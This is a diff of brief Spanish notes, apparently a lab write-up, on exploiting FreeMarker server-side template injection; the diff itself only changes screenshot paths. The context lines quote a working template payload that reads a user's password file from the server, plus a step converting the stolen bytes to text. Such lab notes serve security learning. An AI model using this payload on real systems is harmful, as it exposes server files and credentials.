@@ -4,11 +4,11 @@ Obtenemos su contenido como bytes ASCII y lo convertimos para resolver el labora
 
 Solucion
 aqui nos encontramos con el mismo de freemarker
-![Pasted_image_20250814203648.png](Imagenes/Pasted_image_20250814203648.png)
+![Pasted_image_20250814203648.png](/Imagenes/Pasted_image_20250814203648.png)
 entonce nos vamos a buscar el payload
-![Pasted_image_20250814204301.png](Imagenes/Pasted_image_20250814204301.png)
+![Pasted_image_20250814204301.png](/Imagenes/Pasted_image_20250814204301.png)
 y lo ideal una ves terminado de configurar el payload sera convertirlo ascii
 (${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")})
-![Pasted_image_20250814204346.png](Imagenes/Pasted_image_20250814204346.png)
+![Pasted_image_20250814204346.png](/Imagenes/Pasted_image_20250814204346.png)
 https://www.prepostseo.com/tool/decimal-to-ascii
-![Pasted_image_20250814204605.png](Imagenes/Pasted_image_20250814204605.png)
+![Pasted_image_20250814204605.png](/Imagenes/Pasted_image_20250814204605.png)
